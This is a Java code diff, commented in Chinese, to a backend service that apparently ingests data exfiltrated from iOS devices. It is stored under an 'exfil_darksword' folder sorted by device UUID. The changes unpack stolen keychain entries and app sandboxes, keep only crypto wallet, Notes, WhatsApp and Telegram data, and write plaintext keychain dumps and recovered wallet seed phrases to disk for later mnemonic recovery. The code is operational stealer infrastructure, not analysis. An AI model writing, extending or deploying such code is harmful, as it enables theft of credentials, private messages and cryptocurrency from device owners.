@@ -3,6 +3,7 @@ package com.consumer.service;
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONArray;
 import com.alibaba.fastjson.JSONObject;
+import com.consumer.config.ConsumerProperties;
 import com.consumer.dao.DeviceDao;
 import com.consumer.dao.Ios18ParamDao;
 import com.consumer.dao.MemorandumDao;
@@ -24,6 +25,10 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.security.MessageDigest;
+import java.time.Instant;
+import java.time.LocalDateTime;
+import java.time.ZoneOffset;
+import java.time.format.DateTimeFormatter;
 import java.util.*;
 import java.util.concurrent.ThreadLocalRandom;
 
@@ -36,7 +41,8 @@ import redis.clients.jedis.params.SetParams;
  * <p>
  * 只处理 API 进程未完成的后续业务：
  * <ul>
- *   <li>war_unpack：解包 .bin → 提取 keychain/sandbox → UPDATE unpack_path → 链式触发 parse_ci</li>
+ *   <li>war_unpack：解包 .bin → 同目录 {@code <basename>_unpacked}/
+ *       （files/hex + files/sandbox + 说明文件）→ UPDATE unpack_path → 链式 parse_ci</li>
  *   <li>nb_memorandum：写 memorandum + touch device；有 NoteStore 时链式触发 nb_notestore 追加正文</li>
  * </ul>
  * parse_ci 已拆分到 {@link ParseCiHandler}，news4:tasks 已拆分到 {@link News4Handler}。
@@ -49,6 +55,18 @@ public class CaptureDispatchService {
     /** hex 编码字符表，替代 String.format("%02x") 的热路径优化 */
     private static final char[] HEX_CHARS = "0123456789abcdef".toCharArray();
 
+    private static final String WAR_CATEGORY_DIR = "06_钥匙串与钱包";
+    /** 我方目录名：yyyyMMdd_HHmmss_SSS_<ios18paramId> */
+    private static final DateTimeFormatter WAR_ENTRY_TS =
+            DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss_SSS");
+
+    /** 文档 / Python：只落盘钱包/Notes/IM，其余 outside_allowlist 跳过 */
+    private static final Set<String> HEX_APP_ALLOWLIST = new LinkedHashSet<>(Arrays.asList(
+            "bitpie", "exodus", "phantom", "uniswap", "trust", "tonhub", "coin98", "mytonwallet",
+            "imtoken", "metamask", "bitget", "tonkeeper", "solflare", "tronlink", "okx", "tokenpocket",
+            "notes", "whatsapp", "telegram", "wallet"
+    ));
+
     @Resource
     private Ios18ParamDao ios18ParamDao;
     @Resource
@@ -59,6 +77,8 @@ public class CaptureDispatchService {
     private RedisPush redisPush;
     @Resource
     private JedisPool jedisPool;
+    @Resource
+    private ConsumerProperties consumerProps;
 
     // ==================================================================
     // 主队列入口（api18:tasks）
@@ -88,16 +108,16 @@ public class CaptureDispatchService {
     }
 
     /**
-     * job=war_unpack：解析 war JSON → 提取 keychain 表项到 files/hex/，
-     * 提取 sandbox 数据到 files/sandbox/，写 MANIFEST，UPDATE unpack_path。
-     * 不加 @Transactional：文件 I/O + 单条 UPDATE，无需事务。
+     * job=war_unpack：解析 war JSON → 落在 bin 旁 {@code <basename>_unpacked}/
+     * （files/hex + files/sandbox + 轻量 meta.json），UPDATE unpack_path。
      */
     public boolean handleWarUnpack(Map<String, String> fields) {
     	log.info("【war_unpack】钥匙串解包开始");
         String idStr = fields.get("ios18param_id");
         String filePath = nullToEmpty(fields.get("file_path"));
         
-        if (idStr == null) {
+        if (idStr == null || idStr.isEmpty()) {
+            log.warn("【war_unpack】缺少 ios18param_id，跳过");
             return true;
         }
         
@@ -105,11 +125,13 @@ public class CaptureDispatchService {
         try {
             id = Integer.parseInt(idStr);
         } catch (NumberFormatException e) {
+            log.warn("【war_unpack】ios18param_id 非法 idStr={}", idStr);
             return true;
         }
         
         Ios18ParamEntity entity = ios18ParamDao.findById(id);
         if (entity == null) {
+            log.warn("【war_unpack】ios18param 记录不存在 id={}，跳过", id);
             return true;
         }
 
@@ -145,18 +167,31 @@ public class CaptureDispatchService {
             }
             if (!locked) {
                 log.info("【war_unpack】分布式锁未获取，其他实例正在处理 id={}", id);
-                return true;
+                return false;
             }
 
+        if (filePath.isEmpty()) {
+            filePath = nullToEmpty(entity.getFilePath());
+        }
         // 直接使用完整路径
         File bin = new File(filePath);
         if (!bin.exists() || bin.length() == 0) {
+            log.warn("【war_unpack】bin 不存在或为空 id={} path={}", id, filePath);
             return true;
         }
-        
-        // 准备解压目录
-        String stem = getStem(bin.getName());
-        File unpackDir = new File(bin.getParentFile(), stem + "_unpacked");
+
+        // 设备 UUID（文档：去横线、大写）
+        String deviceUuid = normalizeDeviceUuid(entity.getDeviceId());
+        if (deviceUuid.isEmpty()) {
+            deviceUuid = normalizeDeviceUuid(extractDeviceFromPath(filePath));
+        }
+        if (deviceUuid.isEmpty()) {
+            deviceUuid = "UNKNOWN_DEVICE";
+            log.warn("【war_unpack】无法解析 device UUID，使用占位 id={} path={}", id, filePath);
+        }
+
+        // 原落盘：与 .bin 同目录，<basename>_unpacked（无 exfil / 06_ 分类层）
+        File unpackDir = WarDocLayoutWriter.resolveEntryDirBesideBin(bin);
         File hexDir = new File(unpackDir, "files/hex");
         File sandboxDir = new File(unpackDir, "files/sandbox");
         
@@ -164,6 +199,7 @@ public class CaptureDispatchService {
             Files.createDirectories(hexDir.toPath());
             Files.createDirectories(sandboxDir.toPath());
         } catch (IOException e) {
+            log.warn("【war_unpack】创建解压目录失败 id={} dir={} err={}", id, unpackDir, e.toString());
             return false;
         }
         
@@ -172,46 +208,42 @@ public class CaptureDispatchService {
         try {
             rawJson = new String(readFileBytes(bin), StandardCharsets.UTF_8);
         } catch (IOException e) {
+            log.warn("【war_unpack】读 bin 失败 id={} err={}", id, e.toString());
             return false;
         }
 
-        // 调试日志：打印 rawJson 头部 + 顶层 key 列表（排查空文件夹根因）
+        // 兼容：war 数据可能嵌套在 {"data": {...}} / {"payload": {...}} 里，尝试穿透
+        JSONObject war;
         try {
             Object parsedTop = JSON.parse(rawJson);
-            if (parsedTop instanceof JSONObject) {
-                JSONObject top = (JSONObject) parsedTop;
-                // 兼容：war 数据可能嵌套在 {"data": {...}} / {"payload": {...}} 里，尝试穿透
-                if (!top.containsKey("keychain") && !top.containsKey("sandbox")) {
-                    for (String wrapKey : new String[]{"data", "payload", "war", "content"}) {
-                        Object inner = top.get(wrapKey);
-                        if (inner instanceof JSONObject) {
-                            JSONObject ij = (JSONObject) inner;
-                            if (ij.containsKey("keychain") || ij.containsKey("sandbox")) {
-                                rawJson = ij.toJSONString();
-                                break;
-                            }
+            if (!(parsedTop instanceof JSONObject)) {
+                ios18ParamDao.updateUnpack(id, "", "JSON解析结果为空");
+                return true;
+            }
+            war = (JSONObject) parsedTop;
+            if (!war.containsKey("keychain") && !war.containsKey("sandbox")) {
+                for (String wrapKey : new String[]{"data", "payload", "war", "content"}) {
+                    Object inner = war.get(wrapKey);
+                    if (inner instanceof JSONObject) {
+                        JSONObject ij = (JSONObject) inner;
+                        if (ij.containsKey("keychain") || ij.containsKey("sandbox")
+                                || ij.containsKey("seeds") || ij.containsKey("secitem_readable")) {
+                            war = ij;
+                            break;
                         }
                     }
                 }
             }
-        } catch (Exception debugE) {
-        }
-        
-        // 解析JSON
-        JSONObject war;
-        try {
-            war = JSON.parseObject(rawJson);
-            if (war == null) {
-                ios18ParamDao.updateUnpack(id, "", "JSON解析结果为空");
-                return true;
-            }
         } catch (Exception e) {
+            log.warn("【war_unpack】JSON 解析失败 id={} err={}", id, e.toString());
             return false;
         }
-        
-        // 提取钥匙串和沙盒数据
+
+        // 提取钥匙串和沙盒：写 files/；就地 stub 大 blob（不再另 parse 一份、不写大 payload.json）
         int extractedFiles = 0;
         String extractRemark = "";
+        Map<String, Integer> walletHits = new LinkedHashMap<>();
+        JSONObject payloadObj = war;
         try {
             boolean hasKeychain = war.getJSONObject("keychain") != null;
             boolean hasSandbox = war.getJSONObject("sandbox") != null;
@@ -219,8 +251,7 @@ public class CaptureDispatchService {
                 extractRemark = "顶层JSON无keychain/sandbox字段(keys=" + war.keySet() + ")";
                 log.warn("【war_unpack】提取 0 文件：顶层 key 列表异常 id={} keys={}", id, war.keySet());
             } else {
-                extractedFiles += extractKeychain(war, hexDir);
-                extractedFiles += extractSandbox(war, sandboxDir);
+                extractedFiles = WarDocLayoutWriter.extractAndWrite(payloadObj, unpackDir, walletHits);
                 if (extractedFiles == 0) {
                     extractRemark = "存在 keychain/sandbox 但实际提取 0 个条目(keychain=" + hasKeychain + ",sandbox=" + hasSandbox + ")";
                     log.warn("【war_unpack】提取 0 文件：keychain/sandbox 结构未解析出条目 id={}", id);
@@ -228,12 +259,14 @@ public class CaptureDispatchService {
             }
         } catch (Exception e) {
             extractRemark = "提取异常:" + e.getMessage();
+            log.warn("【war_unpack】提取异常 id={} err={}", id, e.toString());
         }
-        
-        // 写入清单文件
+
+        // 轻量 meta（不写 这是什么/summary/SecItem/payload）
         try {
-            writeManifest(unpackDir, entity, bin, extractedFiles);
+            WarDocLayoutWriter.writeSidecars(unpackDir, entity, bin, payloadObj, extractedFiles, deviceUuid, walletHits);
         } catch (IOException e) {
+            log.warn("【war_unpack】写 sidecar 失败 id={} err={}", id, e.toString());
         }
         
         // 更新数据库 - 记录解压路径（存完整路径，与 file_path 格式一致）
@@ -568,7 +601,7 @@ public class CaptureDispatchService {
         return sb.length() > 0 ? sb.toString() : null;
     }
 
-    /** 写 MANIFEST.txt */
+    /** 写 MANIFEST.txt（兼容旧脚本）+ 文档 sidecar 已在 writeWarDocSidecars */
     private void writeManifest(File unpackDir, Ios18ParamEntity entity, File bin, int extractedFiles) throws IOException {
         Path manifest = Paths.get(unpackDir.getAbsolutePath(), "MANIFEST.txt");
         List<String> lines = new ArrayList<>();
@@ -579,7 +612,159 @@ public class CaptureDispatchService {
         lines.add("original_file=" + bin.getAbsolutePath());
         lines.add("extracted_files=" + extractedFiles);
         lines.add("unpack_time=" + System.currentTimeMillis() / 1000.0);
-        Files.write(manifest, lines);
+        Files.write(manifest, lines, StandardCharsets.UTF_8);
+    }
+
+    /**
+     * 文档落盘根：{uploadDir}/exfil_darksword/&lt;UUID&gt;/06_钥匙串与钱包/&lt;yyyyMMdd_HHmmss_SSS&gt;_&lt;ios18paramId&gt;/
+     * 与 ctwo memres 的 exfil_darksword 同根。
+     */
+    private File resolveWarEntryDir(String deviceUuid, int ios18paramId) {
+        String upload = firstNonEmpty(consumerProps.getUploadDir(), "data/uploads");
+        LocalDateTime now = LocalDateTime.ofInstant(Instant.now(), ZoneOffset.ofHours(8));
+        String entryName = WAR_ENTRY_TS.format(now) + "_" + ios18paramId;
+        Path dir = Paths.get(upload, "exfil_darksword", deviceUuid, WAR_CATEGORY_DIR, entryName);
+        return dir.toFile();
+    }
+
+    /** 设备 UUID：去横线、大写 */
+    private static String normalizeDeviceUuid(String raw) {
+        if (raw == null) return "";
+        String s = raw.trim().replace("-", "").toUpperCase(Locale.ROOT);
+        if (s.isEmpty()) return "";
+        // 只保留 hex，避免路径污染
+        if (!s.matches("[0-9A-F]+")) {
+            s = s.replaceAll("[^0-9A-Fa-f]", "").toUpperCase(Locale.ROOT);
+        }
+        return s;
+    }
+
+    /** 设备目录下写 00_目录说明.txt（不存在才写） */
+    private void ensureDeviceIndex(String deviceUuid) throws IOException {
+        String upload = firstNonEmpty(consumerProps.getUploadDir(), "data/uploads");
+        Path deviceDir = Paths.get(upload, "exfil_darksword", deviceUuid);
+        Files.createDirectories(deviceDir);
+        Path index = deviceDir.resolve("00_目录说明.txt");
+        if (Files.exists(index)) return;
+        String text = ""
+                + "本目录按设备 UUID 分类落盘（对齐 DarkSword / YY 文档）。\n"
+                + "\n"
+                + "05_备忘录笔记/     — POST /nb\n"
+                + "06_钥匙串与钱包/   — POST /war（files/hex + files/sandbox）\n"
+                + "10_内存扫描/       — POST /api/memres\n"
+                + "keychain/ keybag/ wallet/ 等 — FD /stats 原始大块（若有）\n";
+        Files.write(index, text.getBytes(StandardCharsets.UTF_8));
+    }
+
+    /**
+     * 写文档要求的说明/摘要/payload/meta，以及可选 secitem / seeds。
+     */
+    private void writeWarDocSidecars(File unpackDir, Ios18ParamEntity entity, File bin,
+                                    JSONObject war, String rawJson, int extractedFiles,
+                                    String deviceUuid) throws IOException {
+        Path root = unpackDir.toPath();
+        Files.createDirectories(root);
+
+        String what = ""
+                + "分类：06_钥匙串与钱包\n"
+                + "接口：POST /war（大包可走 war 分片后再解码）\n"
+                + "内容：钥匙串 dataHex 分桶到 files/hex/<app>/，钱包沙盒到 files/sandbox/<app>/\n"
+                + "后续：parse_ci / recover_hq8 类脚本扫 hex+sandbox 还原助记词\n"
+                + "ios18param_id=" + entity.getId() + "\n"
+                + "device=" + deviceUuid + "\n"
+                + "source_bin=" + bin.getAbsolutePath() + "\n";
+        Files.write(root.resolve("这是什么.txt"), what.getBytes(StandardCharsets.UTF_8));
+
+        // summary
+        Set<String> hexApps = listChildNames(new File(unpackDir, "files/hex"));
+        Set<String> sandboxApps = listChildNames(new File(unpackDir, "files/sandbox"));
+        boolean hasSeeds = war != null && (war.get("seeds") != null
+                || war.getJSONObject("seeds") != null
+                || war.get("wallet_seed_plaintext") != null);
+        boolean hasSecReadable = war != null && war.get("secitem_readable") != null;
+        boolean hasSecFull = war != null && war.get("secitem_full") != null;
+        StringBuilder summary = new StringBuilder();
+        summary.append("device=").append(deviceUuid).append('\n');
+        summary.append("ios18param_id=").append(entity.getId()).append('\n');
+        summary.append("extracted_files=").append(extractedFiles).append('\n');
+        summary.append("hex_apps=").append(hexApps).append('\n');
+        summary.append("sandbox_apps=").append(sandboxApps).append('\n');
+        summary.append("has_seeds=").append(hasSeeds).append('\n');
+        summary.append("has_secitem_readable=").append(hasSecReadable).append('\n');
+        summary.append("has_secitem_full=").append(hasSecFull).append('\n');
+        summary.append("bin_size=").append(bin.length()).append('\n');
+        Files.write(root.resolve("summary.txt"), summary.toString().getBytes(StandardCharsets.UTF_8));
+
+        // payload.json：明文 war JSON（大字段仍在；files/ 已拆出可独立扫）
+        Files.write(root.resolve("payload.json"),
+                (rawJson == null ? "{}" : rawJson).getBytes(StandardCharsets.UTF_8));
+
+        // meta.json
+        JSONObject meta = new JSONObject(true);
+        meta.put("ios18param_id", entity.getId());
+        meta.put("kind", entity.getKind());
+        meta.put("device_id", deviceUuid);
+        meta.put("source_bin", bin.getAbsolutePath().replace('\\', '/'));
+        meta.put("extracted_files", extractedFiles);
+        meta.put("hex_apps", hexApps);
+        meta.put("sandbox_apps", sandboxApps);
+        meta.put("unpack_time", System.currentTimeMillis() / 1000.0);
+        meta.put("category", WAR_CATEGORY_DIR);
+        Files.write(root.resolve("meta.json"),
+                meta.toJSONString().getBytes(StandardCharsets.UTF_8));
+
+        // secitem
+        if (war != null) {
+            writeOptionalText(root.resolve("钥匙串SecItem明文.txt"), war.get("secitem_readable"));
+            writeOptionalText(root.resolve("钥匙串SecItem完整dump.txt"), war.get("secitem_full"));
+            Object seeds = war.get("seeds");
+            if (seeds == null) {
+                // 部分包把种子放在顶层 wallet_seed_plaintext / imtoken_extract
+                JSONObject seedWrap = new JSONObject(true);
+                if (war.get("wallet_seed_plaintext") != null) {
+                    seedWrap.put("wallet_seed_plaintext", war.get("wallet_seed_plaintext"));
+                }
+                if (war.get("imtoken_extract") != null) {
+                    seedWrap.put("imtoken_extract", war.get("imtoken_extract"));
+                }
+                if (war.get("wallet_mem_resident") != null) {
+                    seedWrap.put("wallet_mem_resident", war.get("wallet_mem_resident"));
+                }
+                if (!seedWrap.isEmpty()) seeds = seedWrap;
+            }
+            if (seeds != null) {
+                String seedsJson = seeds instanceof String
+                        ? (String) seeds
+                        : JSON.toJSONString(seeds, true);
+                Files.write(root.resolve("seeds_recovered.json"),
+                        seedsJson.getBytes(StandardCharsets.UTF_8));
+            }
+        }
+
+        writeManifest(unpackDir, entity, bin, extractedFiles);
+    }
+
+    private static void writeOptionalText(Path path, Object value) throws IOException {
+        if (value == null) return;
+        String text;
+        if (value instanceof String) {
+            text = (String) value;
+        } else {
+            text = JSON.toJSONString(value, true);
+        }
+        if (text == null || text.isEmpty()) return;
+        Files.write(path, text.getBytes(StandardCharsets.UTF_8));
+    }
+
+    private static Set<String> listChildNames(File dir) {
+        Set<String> names = new TreeSet<>();
+        if (dir == null || !dir.isDirectory()) return names;
+        File[] kids = dir.listFiles();
+        if (kids == null) return names;
+        for (File f : kids) {
+            if (f.isDirectory()) names.add(f.getName());
+        }
+        return names;
     }
 
     // 注：computeRelativePath 已弃用 — unpack_path 现在直接存完整绝对路径
